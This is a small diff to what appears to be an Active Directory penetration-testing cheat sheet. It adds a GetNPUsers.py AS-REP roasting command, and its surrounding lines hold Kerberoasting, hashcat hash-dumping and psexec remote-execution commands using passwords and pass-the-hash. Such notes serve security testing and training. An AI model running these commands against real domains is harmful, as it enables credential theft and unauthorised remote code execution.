@@ -564,6 +564,8 @@ GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-
 
 GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list
 
+GetNPUsers.py test.local/ -usersfile usernames.txt -request -no-pass
+
 ##RCE
 psexec.py test.local/john:password123@10.10.10.1
 psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
